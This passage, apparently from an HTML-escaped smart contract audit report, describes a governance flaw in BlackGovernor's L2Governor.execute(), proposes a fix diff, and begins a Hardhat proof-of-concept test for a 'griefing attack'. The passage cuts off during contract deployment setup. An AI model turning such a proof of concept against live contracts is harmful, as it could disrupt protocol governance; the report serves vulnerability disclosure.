proposals:\u003c/li\u003e\n\u003c/ul\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"62\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e// In contracts/governance/Governor.sol L2Governor.execute()\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        require(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e-           status == ProposalState.Succeeded || status == ProposalState.Defeated || status == ProposalState.Expired,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e-           \u0026quot;Governor: proposal not successful or defeated\u0026quot;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e+           status == ProposalState.Succeeded,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e+           \u0026quot;Governor: proposal not Succeeded\u0026quot;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        );\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cul\u003e\n\u003cli\u003eEnhance \u003ccode\u003eMinterUpgradeable.nudge()\u003c/code\u003e: The \u003ccode\u003enudge()\u003c/code\u003e function should not re-check proposal status if \u003ccode\u003eL2Governor.execute()\u003c/code\u003e is fixed. If status checking is still desired for some reason, it must be passed the \u003ccode\u003eproposalId\u003c/code\u003e to correctly query \u003ccode\u003eBlackGovernor.state(proposalId)\u003c/code\u003e.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"coded-proof-of-concept\" style=\"position:relative;\"\u003e\u003ca href=\"#coded-proof-of-concept\" aria-label=\"coded proof of concept permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eCoded Proof of Concept\u003c/h3\u003e\n\u003cdetails\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"63\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003econst { expect } = require(\u0026quot;chai\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003econst { ethers, upgrades } = require(\u0026quot;hardhat\u0026quot;); \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003easync function advanceTime(time) {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await ethers.provider.send(\u0026quot;evm_increaseTime\u0026quot;, [time]);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await ethers.provider.send(\u0026quot;evm_mine\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e}\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003econst CONTRACT_WEEK = 900; \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003econst ZERO_ADDRESS = ethers.constants.AddressZero;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003efunction calculateEpochNextJS(timestamp) {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const weekDuration = ethers.BigNumber.from(CONTRACT_WEEK);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const tsBN = ethers.BigNumber.from(timestamp);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    return tsBN.sub(tsBN.mod(weekDuration)).add(weekDuration);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e}\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003edescribe(\u0026quot;BlackGovernor - Griefing Attack via Flawed L2Governor.execute()\u0026quot;, function () {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    let deployer, proposerEOA, smVoter1EOA, smVoter2EOA, attackerEOA, teamEOA;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    let blackToken, permissionsRegistry, tokenHandler, votingEscrow, rewardsDistributor;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    let pairGenerator, pairFactory, bribeFactoryV3, gaugeFactoryV2, gaugeFactoryCL;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    let algebraPoolAPIStorage; \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    let voterV3; \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    let gaugeManager, minterUpgradeable, blackGovernor;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    let votingBalanceLogic, voterFactoryLib; \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    let nudgeCalldata;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    beforeEach(async function () {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        [deployer, proposerEOA, smVoter1EOA, smVoter2EOA, attackerEOA, teamEOA] = await ethers.getSigners();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;Starting beforeEach: Deploying ALL REAL in-scope contracts...\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const VotingBalanceLogicFactory = await ethers.getContractFactory(\u0026quot;VotingBalanceLogic\u0026quot;, deployer);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        votingBalanceLogic = await VotingBalanceLogicFactory.deploy();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await votingBalanceLogic.deployed();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const VoterFactoryLibFactory = await ethers.getContractFactory(\u0026quot;VoterFactoryLib\u0026quot;, deployer); \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        voterFactoryLib = await VoterFactoryLibFactory.deploy();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await voterFactoryLib.deployed();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;  Libraries deployed (VBL, VFL).\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const BlackTokenFactory = await ethers.getContractFactory(\u0026quot;Black\u0026quot;, deployer);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        blackToken = await BlackTokenFactory.deploy();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await blackToken.deployed();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;  Black token deployed.\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await blackToken.connect(deployer).initialMint(deployer.address); \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;  Black token initialMint called by deployer.\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const PermissionsRegistryFactory = await ethers.getContractFactory(\u0026quot;PermissionsRegistry\u0026quot;, deployer);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        permissionsRegistry = await PermissionsRegistryFactory.deploy();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await permissionsRegistry.deployed();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;  PermissionsRegistry deployed.\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await permissionsRegistry.connect(deployer).setRoleFor(deployer.address, \u0026quot;GAUGE_ADMIN\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;  GAUGE_ADMIN role granted to deployer.\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await permissionsRegistry.connect(deployer).setRoleFor(deployer.address, \u0026quot;GOVERNANCE\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;  GOVERNANCE role granted to deployer.\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const TokenHandlerFactory = await ethers.getContractFactory(\u0026quot;TokenHandler\u0026quot;, deployer);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        tokenHandler = await TokenHandlerFactory.deploy(permissionsRegistry.address);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await tokenHandler.deployed();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;  TokenHandler deployed.\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const VotingEscrowFactory = await ethers.getContractFactory(\u0026quot;VotingEscrow\u0026quot;, {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            signer: deployer,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            libraries: { VotingBalanceLogic: votingBalanceLogic.address }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        });\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        votingEscrow = await VotingEscrowFactory.deploy(blackToken.address, teamEOA.address, teamEOA.address);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await votingEscrow.deployed();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await votingEscrow.connect(deployer).setTeam(teamEOA.address); \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;  VotingEscrow deployed.\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const RewardsDistributorFactory = await ethers.getContractFactory(\u0026quot;RewardsDistributor\u0026quot;, deployer);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        rewardsDistributor = await RewardsDistributorFactory.deploy(votingEscrow.address);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await rewardsDistributor.deployed();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;  RewardsDistributor deployed.\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const PairGeneratorFactory = await ethers.getContractFactory(\u0026quot;PairGenerator\u0026quot;, deployer);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        pairGenerator = await PairGeneratorFactory.deploy();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await pairGenerator.deployed();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const PairFactoryContract = await ethers.getContractFactory(\u0026quot;PairFactory\u0026quot;, deployer);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        pairFactory = await upgrades.deployProxy(PairFactoryContract, \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            [pairGenerator.address], \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            { initializer: \u0026#39;initialize\u0026#39;, kind: \u0026#39;transparent\u0026#39;, unsafeAllow: [\u0026#39;constructor\u0026#39;] }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await pairFactory.deployed();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;  PairFactory (proxy) deployed.\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const AlgebraPoolAPIStorageFactory = await ethers.getContractFactory(\u0026quot;AlgebraPoolAPIStorage\u0026quot;, deployer);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        algebraPoolAPIStorage = await upgrades.deployProxy(AlgebraPoolAPIStorageFactory, \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            [ZERO_ADDRESS, permissionsRegistry.address], \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            {initializer: \u0026#39;initialize\u0026#39;, kind: \u0026#39;transparent\u0026#39;, unsafeAllow: [\u0026#39;constructor\u0026#39;]} \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await algebraPoolAPIStorage.deployed();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;  AlgebraPoolAPIStorage (proxy) deployed.\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const GaugeFactoryV2Contract = await ethers.getContractFactory(\u0026quot;GaugeFactory\u0026quot;, deployer);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        gaugeFactoryV2 = await upgrades.deployProxy(GaugeFactoryV2Contract, \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            [permissionsRegistry.address], \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            { initializer: \u0026#39;initialize\u0026#39;, kind: \u0026#39;transparent\u0026#39;, unsafeAllow: [\u0026#39;constructor\u0026#39;] }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await gaugeFactoryV2.deployed();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const GaugeFactoryCLContract = await ethers.getContractFactory(\u0026quot;GaugeFactoryCL\u0026quot;, deployer);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        gaugeFactoryCL = await upgrades.deployProxy(GaugeFactoryCLContract, \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            [permissionsRegistry.address], \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            { initializer: \u0026#39;initialize\u0026#39;, kind: \u0026#39;transparent\u0026#39;, unsafeAllow: [\u0026#39;constructor\u0026#39;] }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await gaugeFactoryCL.deployed();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await gaugeFactoryCL.connect(deployer).setAlgebraPoolApi(algebraPoolAPIStorage.address);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;  Gauge Factories deployed.\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const GaugeManagerContractFactory = await ethers.getContractFactory(\u0026quot;GaugeManager\u0026quot;, { \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            signer: deployer,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            libraries: { VoterFactoryLib: voterFactoryLib.address }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        });\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        gaugeManager = await upgrades.deployProxy(GaugeManagerContractFactory, [\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            votingEscrow.address, tokenHandler.address, gaugeFactoryV2.address, gaugeFactoryCL.address,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            pairFactory.address, ZERO_ADDRESS, permissionsRegistry.address\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        ], { \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            initializer: \u0026#39;initialize\u0026#39;, \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            kind: \u0026#39;transparent\u0026#39;,         \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            unsafeAllow: [\u0026#39;constructor\u0026#39;, \u0026#39;external-library-linking\u0026#39;], \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        });\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await gaugeManager.deployed();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;  GaugeManager (proxy) deployed.\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const VoterV3Contract = await ethers.getContractFactory(\u0026quot;VoterV3\u0026quot;, deployer);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        voterV3 = await upgrades.deployProxy(VoterV3Contract, [\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            votingEscrow.address, tokenHandler.address, gaugeManager.address, permissionsRegistry.address\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        ], { \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            initializer: \u0026#39;initialize\u0026#39;, \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            kind: \u0026#39;transparent\u0026#39;, \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            unsafeAllow: [\u0026#39;constructor\u0026#39;] \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        });\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await voterV3.deployed();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;  VoterV3 (proxy) deployed.\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await gaugeManager.connect(deployer).setVoter(voterV3.address);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await votingEscrow.connect(teamEOA).setVoter(voterV3.address);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const BribeFactoryV3Contract = await ethers.getContractFactory(\u0026quot;BribeFactoryV3\u0026quot;, deployer);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        bribeFactoryV3 = await upgrades.deployProxy(BribeFactoryV3Contract, [\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            voterV3.address, gaugeManager.address, permissionsRegistry.address, tokenHandler.address\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        ], { initializer: \u0026#39;initialize\u0026#39;, kind: \u0026#39;transparent\u0026#39;, unsafeAllow: [\u0026#39;constructor\u0026#39;] });\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await bribeFactoryV3.deployed();\u003c/span\u003e\u003c/span\u003e\n\u003cspan 